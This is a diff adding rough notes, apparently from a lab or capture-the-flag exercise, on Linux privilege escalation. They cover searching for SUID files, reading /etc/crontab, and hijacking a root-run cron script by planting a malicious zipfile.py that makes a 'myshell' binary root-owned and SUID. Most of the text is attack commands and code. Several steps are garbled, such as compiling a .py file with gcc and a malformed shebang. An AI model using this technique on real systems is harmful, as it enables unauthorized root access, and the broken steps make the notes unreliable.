@@ -1,0 +1,46 @@
+```
+Script must be compiled into a binary format
+that presents SUID/SGID permissions of a higher privileged user (the executable will inherit the owner’s privileges). You can search for SUID files within a Linux system, through the following command:
+$find / -perm /4000
+
+Or you can search for files that have both SUID and SGID permissions:
+
+$find / -perm /6000
+
+```
+
+$cat /etc/crontab
+
+#check if backup.py present with root previledges
+
+#create myshell (if ran with sudo; u become root
+
+```
+#myshell save in /home/user_name/www/
+os.setuid(0)
+os.setgid(0)
+
+```
+$ gcc myshell.py
+    or
+$ !# /usr/bin/env python3
+
+~/www$nano zipfile.py
+
+#zipfile.py
+
+import os
+#test file
+os.system('touch /home/user_name/www/ran.txt')
+os.system('chown root.root /home/user_name/www/myshell')
+os.system('chmod u+s /home/user_name/www/myshell')
+
+```
+
+~/www$watch ls
+
+#wait for .pyc file to get created
+
+./myshell
+
+#prevesced!!
